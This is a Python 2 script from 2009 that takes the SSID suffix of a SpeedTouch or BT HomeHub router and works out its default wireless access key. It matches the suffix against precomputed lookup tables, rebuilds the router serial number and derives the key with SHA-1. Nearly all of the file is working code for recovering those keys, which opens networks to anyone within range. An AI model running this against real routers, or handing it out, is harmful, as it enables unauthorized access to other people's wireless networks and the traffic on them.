# touchspeedcalc_test.py (2009/10/09)
# Example for demonstrating use of SpeedTouch wireless router default password lookup tables
#
# 	http://www.mentalpitstop.com/touchspeedcalc
#
# Distributed under the Creative Commons Attribution Non-commercial Share-Alike license,
# http://creativecommons.org/licenses/by-nc-sa/3.0/us/
# Contact me at mentalpitstop.com for more information and licensing info.
#
# Make sure the correct modules (like hashlib) are installed in your python version, as I've noticed some python versions (2.4 vs 2.6) handle this differently
# Created and tested with Python 2.6
# Note that the data files must be located in the /data/ subdirectory for this script to find them.
#
# Usage:
# 	python2.6 touchspeedcalc_test.py [SSID]
# Where [SSID] are the last 6 characters of the SSID.
#
# Edit the 'YEARS' variable if you want to include 2010 (not tested)

import hashlib
import sys
import binascii
import re


#SSIDEND = "1234AB"	#example
if len(sys.argv) < 2:
  print str(len(sys.argv))
  print "Usage: "
  print "  python2.6 touchspeedcalc_test.py [SSID]"
  print "Where [SSID] are the last 6 characters of the SSID."
  sys.exit()
  
SSIDEND = sys.argv[1].upper()
#sys.argv[1].decode("hex")


if len(SSIDEND) == 6:
  #SpeedTouch:
  FINDPOS = 0  
elif len(SSIDEND) == 4:
  #BT HomeHub:
  FINDPOS = 1
else:
  print "SSID-end must be either 6 or 4 characters."
  sys.exit()

YEARS = [ 2009, 2008, 2007, 2006, 2010, 2011, 2005, 2004 ]
#YEARS = [ 2009, 2008, 2007, 2006, 2005, 2004, 2010 ]
#YEAR = sys.argv[2].lower()

def ascii2hex(char):
  return hex(ord(char))[2:].upper()

CHARSET = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
BINCODE = binascii.unhexlify("".join(SSIDEND.split()))
#print "Compressed SSID: ", BINCODE


for YEAR in YEARS:
  FILE = "data/touchspeedcalc_" + str(YEAR) + ".dat"
  INFILE = open(FILE,"rb")
  FILEDATA = INFILE.read()
  INFILE.close()
  WHEREFOUND = FILEDATA.find(BINCODE, 0)
  while (WHEREFOUND > -1):
    if WHEREFOUND % 3 == FINDPOS:
      PRODIDNUM = (WHEREFOUND / 3) % (36*36*36)
      PRODWEEK = (WHEREFOUND / 3) / (36*36*36) +1
      PRODID1 = PRODIDNUM / (36*36)
      PRODID2 = (PRODIDNUM / 36) % 36
      PRODID3 = PRODIDNUM % 36
      SERIAL = 'CP%02d%02d%s%s%s' % (YEAR-2000,PRODWEEK,ascii2hex(CHARSET[PRODID1:PRODID1+1]),ascii2hex(CHARSET[PRODID2:PRODID2+1]),ascii2hex(CHARSET[PRODID3:PRODID3+1]))
      SHA1SUM = hashlib.sha1(SERIAL).digest().encode("hex").upper()
      SSID = SHA1SUM[-6:]
      ACCESSKEY = SHA1SUM[0:10]
      if len(SSIDEND) == 4:
        # BT HomeHub password is lowercase:
        ACCESSKEY = ACCESSKEY.lower()

      #print str(YEAR), "location:", str(WHEREFOUND),
      print "YEAR:", str(YEAR), "WEEK:", str(PRODWEEK), "PRODIDNUM:", str(PRODIDNUM)
      #print "Serial number:", str(SERIAL)  # does not give proper serial number for the thompsons BT series
      #print "SHA1SUM:", str(SHA1SUM)
      print "ACCESSKEY:", str(ACCESSKEY)

    WHEREFOUND = FILEDATA.find(BINCODE, WHEREFOUND+1)
